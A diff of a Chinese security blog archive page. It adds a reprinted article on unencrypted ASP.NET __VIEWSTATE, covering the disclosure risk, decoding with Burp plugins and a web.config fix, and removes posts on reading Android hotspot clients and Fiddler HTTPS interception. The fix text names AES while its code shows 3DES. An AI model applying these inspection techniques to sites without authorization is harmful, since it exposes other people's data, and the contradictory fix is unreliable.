+<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
+</blockquote>
+<h2><span id="参考材料">参考材料</span></h2><blockquote>
+<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Plaintext-VIEWSTATE/">
+                未加密的__VIEWSTATE参数
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="未加密的__viewstate参数">未加密的__VIEWSTATE参数</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121357450">默默提升实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="0-知识补充">0. 知识补充</span></h2><blockquote>
+<p>表单提交在遇到服务器返回错误时候，再次填写表单时，上次填写的值不会被清空。</p>
+<p>维持ViewState是ASP.NET Web Forms的默认设置。如果你想不维持ViewState，需在.aspx页面顶部包含提示&lt;%@Page EnableViewState&#x3D;“false” %&gt;，或者或者向任意控件添加属性EnableViewState&#x3D;“false” 。</p>
+<p>没有设置维持ViewState，当点击按钮提交，表单值将消失。</p>
+</blockquote>
+<h3><span id="viewstate是如何使用的">ViewState是如何使用的</span></h3><blockquote>
+<p>ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于“POST”请求。当Web应用程序进行 POST 请求时，客户端将其发送到服务器。</p>
+<p>ViewState 以序列化数据的形式出现，当客户端再次进行请求（ViewState）被发送到服务器时，将进行反序列化。</p>
+<p>为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。</p>
+</blockquote>
+<h2><span id="1-漏洞描述">1. 漏洞描述</span></h2><blockquote>
+<p>__VIEWSTATE 参数未加密，存在有人拦截存储在 ViewState 中的信息的机会。</p>
+</blockquote>
+<h2><span id="2-漏洞危害">2. 漏洞危害</span></h2><blockquote>
+<p>可能导致敏感信息泄露。</p>
+</blockquote>
+<h2><span id="3-漏洞验证">3. 漏洞验证</span></h2><blockquote>
+<p>使用工具：Burp Suit，需要安装插件ViewState Editor，如下图所示：</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/1.png" alt="image"></p>
+<p>POC：{EXTRACTED_STRINGS}:string&#x3D; -2140192582</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/2.png" alt="image"></p>
+<p>查看存在该问题的页面源码，搜索__VIEWSTATE，可以看到对应的value值，对该段值进行base64解码。可以得到对应的信息，在Burp Suit中使用 ViewState Decoder插件可以进行解码。</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/3.png" alt="image"><br><img src="/2023/09/03/Plaintext-VIEWSTATE/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="其他解码工具">其他解码工具</span></h3><blockquote>
+<p>网页：<a target="_blank" rel="noopener" href="https://www.httpdebugger.com/tools/ViewstateDecoder.aspx">https://www.httpdebugger.com/tools/ViewstateDecoder.aspx</a></p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/5.png" alt="image"></p>
+<p>软件：ViewStateDecoder2.0.exe</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="4-漏洞建议">4. 漏洞建议</span></h2><blockquote>
+<p>请将machineKey验证类型设置为AES。这将使得 ASP.NET 使用AES算法加密ViewState 值。</p>
+<p>​打开 Web.Config 并在 &lt;system.web&gt; 元素下添加以下行：<machinekey validation="“AES”/">如下：</machinekey></p>
+<p><code>&lt;system.web&gt; &lt;machinekey validation=&quot;3DES&quot;&gt;&lt;/machinekey&gt;&lt;/system.web&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-3.0/w8h3skw9%28v=vs.85%29">machineKey 元素（ASP.NET 设置架构）</a></p>
+</blockquote>
+<blockquote>
+<p>关于ViewState的相关demo案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg">ViewState 反序列化及其利用</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
                 Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
             </a>
@@ -379,95 +796,18 @@
     </section>
 </article>
   
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/02/Android-WIFI/">
-                Android 开启个人热点时 获取连接人数以及连接上的设备信息
-            </a>
-        </h2>
-    
-    <time>
-        Sep 2, 2023
-    </time>
-    <section class="content">
-        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
-</blockquote>
-<h2><span id="起因">起因</span></h2><blockquote>
-<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
-<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
-<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
-<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
-<p>好了 那么问题就简单了</p>
-<p>直接贴代码：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
-<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WIFI/" rel="tag">WIFI</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/02/Fiddler-HTTPS/">
-                Fiddler设置解密https的网络数据
-            </a>
-        </h2>
-    
-    <time>
-        Sep 2, 2023
-    </time>
-    <section class="content">
-        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
-</blockquote>
-<h2><span id="原理">原理</span></h2><blockquote>
-<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
-</blockquote>
-<h2><span id="步骤">步骤</span></h2><blockquote>
-<p>解密https需要手动开启，步骤如下：</p>
-</blockquote>
-<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
 </section>
 
+
+  <nav id="page-nav" class="clearfix">
+    
+    
+    <a class="next" rel="next" href="/archives/2023/09/page/2/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
+    
+  </nav>
 
 
         <script>setLoadingBarProgress(60);</script>
